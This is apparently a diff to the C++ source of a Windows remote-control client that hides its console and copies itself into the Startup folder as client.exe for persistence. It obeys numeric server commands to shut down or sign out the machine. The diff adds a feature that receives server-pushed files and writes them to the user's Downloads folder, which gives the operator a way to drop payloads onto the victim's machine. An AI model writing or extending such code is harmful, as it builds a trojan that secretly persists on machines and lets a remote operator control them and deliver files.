@@ -3,6 +3,8 @@
 #include <windows.h>
 #include <fstream>
 #include <vector>
+#include <iostream>
+#include <algorithm>
 
 void Hide() {
     AllocConsole();
@@ -62,6 +64,87 @@ std::vector<std::string> readServerInfo() {
 }
 
 
+bool recv_all(SOCKET socket, char* buffer, size_t size) {
+    size_t total_received = 0;
+    while (total_received < size) {
+        int received = recv(socket, buffer + total_received, size - total_received, 0);
+        if (received <= 0) {
+            return false;
+        }
+        total_received += received;
+    }
+    return true;
+}
+
+void ReceiveFile(SOCKET sock) {
+	// 1. Receive filename length (4 bytes)
+	uint32_t fname_len = 0;
+	if (!recv_all(sock, (char*)&fname_len, sizeof(fname_len))) {
+		std::cerr << "[!] Failed to receive filename length\n";
+		return;
+	}
+
+	// 3. Receive filename
+	std::string fname(fname_len, '\0');
+	if (!recv_all(sock, &fname[0], fname_len)) {
+		std::cerr << "[!] Failed to receive filename\n";
+		return;
+	} printf("filename: %s\n", fname.c_str());
+
+	// 4. Receive file size (8 bytes)
+	uint64_t file_size = 0;
+	if (!recv_all(sock, (char*)&file_size, sizeof(file_size))) {
+		std::cerr << "[!] Failed to receive file size\n";
+		return;
+	}  
+
+    // // receive path length
+    // uint64_t filePathLen = 0;
+    // if (!recv_all(sock, (char*)&filePathLen, sizeof(filePathLen))) {
+    //     std::cerr << "[!] Failed to receive file path length\n";
+    //     return;
+    // }
+
+    // // receive path
+    // std::string filePath(filePathLen, '\0');
+    // if (!recv_all(sock, &filePath[0], filePathLen)) {
+    //     std::cerr << "[!] Failed to receive file path\n";
+    //     return;
+    // }
+
+    // std::string outputPath = filePath + "\\" + fname;
+    // printf("output path: %s\n", outputPath.c_str());
+
+	std::cout << "[+] Receiving file: " << fname << " (" << file_size << " bytes)\n";
+
+	// 5. Open local file for writing
+	std::ofstream file("C:\\users\\movements\\Downloads\\" + fname, std::ios::binary);
+	if (!file.is_open()) {
+		std::cerr << "[!] Failed to open local file for writing: " << fname << "\n";
+		return;
+	}
+
+	// 6. Receive file content in chunks
+	const size_t buffer_size = 4096;
+	char buffer[buffer_size];
+	uint64_t total_received = 0;
+
+	while (total_received < file_size) {
+		size_t to_read = (std::min)((uint64_t)buffer_size, file_size - total_received);
+		int received = recv(sock, buffer, to_read, 0);
+		if (received <= 0) {
+			std::cerr << "[!] Connection lost during file transfer\n";
+			file.close();
+			return;
+		}
+		file.write(buffer, received);
+		total_received += received;
+	}
+
+	file.close();
+	std::cout << "[+] File " << fname << " received successfully.\n";
+}
+
 void HandleCommands(std::string command, SOCKET sock) {
 	if (command == "229892") {
 		std::cout << "[!] Server sent a shutdown signal.\n"; // shutdown
@@ -81,11 +164,10 @@ void HandleCommands(std::string command, SOCKET sock) {
 		std::this_thread::sleep_for(std::chrono::seconds(2));	
         closesocket(sock);      // close before signing out
 		ExitWindowsEx(0, 0);
-	} 
-
-    // else {
-    //     std::cout << "[!] Server sent this unknown command: " << command << "\n";
-    // }
+	} else if (command == "993123") {
+        std::cout << "[!] Server is sending a file.\n";
+		ReceiveFile(sock);
+	}
 }
 
 void SaveOnStartUp() {
@@ -106,9 +188,8 @@ void SaveOnStartUp() {
         return;
     }
 
-    std::cout << "[+] Program will be saved here: " << destinationPath << '\n';
-
     snprintf(destinationPath, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe", appDataDir);
+    std::cout << "[+] Program will be saved here: " << destinationPath << '\n';
 
     if (CopyFile(currentPath, destinationPath, FALSE) == 0) {
         std::cerr << "[!] Failed to copy the file. Error: " << GetLastError() << std::endl;
